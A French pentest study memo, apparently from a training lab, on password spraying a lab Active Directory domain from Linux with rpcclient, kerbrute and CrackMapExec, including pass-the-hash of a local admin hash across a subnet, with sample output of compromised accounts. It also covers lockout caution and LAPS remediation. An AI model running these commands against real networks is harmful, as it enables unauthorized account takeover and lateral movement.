# Mémo — Password Spraying interne depuis Linux

> Suite de [Password Spraying & Password Policy](memo-password-spraying.md) : on a maintenant
> la **liste d'users** (`valid_users.txt`) et la **policy** → on exécute le spray.
> **Objectif** : valider un mot de passe commun sur la liste → credentials de domaine.
> ⚠️ Toujours **respecter le lockout** (ex. 2-3 essais / ~31 min) et **logguer** l'activité.

---

## 1. rpcclient (one-liner Bash)

Un login valide se repère par la réponse **`Authority Name`** → on filtre dessus.

```bash
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```
Sortie (hits) :
```
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage,    Authority Name: INLANEFREIGHT
```
> `$u%Welcome1` = user + mot de passe testé. `grep Authority` = ne garder que les succès.

---

## 2. Kerbrute (passwordspray)

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
Sortie :
```
[+] VALID LOGIN:  sgage@inlanefreight.local:Welcome1
Done! Tested 57 logins (1 successes) in 0.172 seconds
```
> ⚠️ Les échecs de pré-auth **comptent** vers le lockout (contrairement à l'énumération `userenum`).

---

## 3. CrackMapExec (liste d'users × 1 mot de passe)

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
- `grep +` → ne garder que les logins valides (`[+]`), éviter de scroller les échecs.
```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Valider un hit
```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

---

## 4. Réutilisation du mot de passe admin local

Le spray ne se limite pas aux comptes de domaine. Si on obtient le **mot de passe en clair ou le hash NTLM**
de l'admin local, on peut le tester sur **plusieurs hôtes** (réutilisation très fréquente à cause des
**gold images** en déploiement automatisé).

**Pistes de réutilisation / variantes :**
- `$desktop%@admin123` sur un poste → tester `$server%@admin123` sur les serveurs.
- Compte local non standard `bsmith` → mot de passe peut-être réutilisé pour le compte de domaine `bsmith`.
- User `ajones` → tester le même mdp sur son compte admin `ajones_adm`.
- **Trusts de domaine** : des creds valides dans le domaine A peuvent l'être pour un user similaire en B.
- Cibler les **hôtes à forte valeur** (SQL, Exchange) → users privilégiés souvent connectés / creds en mémoire.

### Spray du hash NT sur un subnet (Pass-the-Hash)
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
```
SMB  172.16.5.50   445  ACADEMY-EA-MX01  [+] ...\administrator 88ad... (Pwn3d!)
SMB  172.16.5.25   445  ACADEMY-EA-MS01  [+] ...\administrator 88ad... (Pwn3d!)
SMB  172.16.5.125  445  ACADEMY-EA-WEB0  [+] ...\administrator 88ad... (Pwn3d!)
```
- ⚠️ **`--local-auth` OBLIGATOIRE** : 1 seul essai par machine (pas de risque de lockout) + auth **locale**.
  - **Sans** ce flag → auth sur le **domaine** → risque de **verrouiller l'administrateur du domaine**.
- `-H <hash>` = Pass-the-Hash (pas besoin du mdp en clair).
- `Pwn3d!` = admin local valide sur l'hôte.

> Technique **bruyante** → éviter sur un assessment furtif. Mais à **toujours tester** (défaut courant à remonter au client).
> **Remédiation** : **LAPS** (Local Administrator Password Solution) → mdp local unique par hôte, rotation auto.

---

## 5. À retenir

| Point                         | Commande                                                        |
|-------------------------------|-----------------------------------------------------------------|
| rpcclient (one-liner)         | `for u in $(cat users); rpcclient -U "$u%<pw>" ... \| grep Authority` |
| Succès rpcclient              | réponse **`Authority Name`**                                    |
| Kerbrute spray                | `kerbrute passwordspray -d <dom> --dc <DC> users <pw>`          |
| CrackMapExec spray            | `crackmapexec smb <DC> -u users -p <pw> \| grep +`              |
| Valider un hit                | `crackmapexec smb <DC> -u <user> -p <pw>`                       |
| Spray admin local (PtH)       | `crackmapexec smb --local-auth <subnet> -u administrator -H <hash>` |
| Flag anti-lockout             | **`--local-auth`** (1 essai/machine, auth locale)               |
| `Pwn3d!`                      | admin local valide sur l'hôte                                   |
| Remédiation réutilisation     | **LAPS**                                                        |
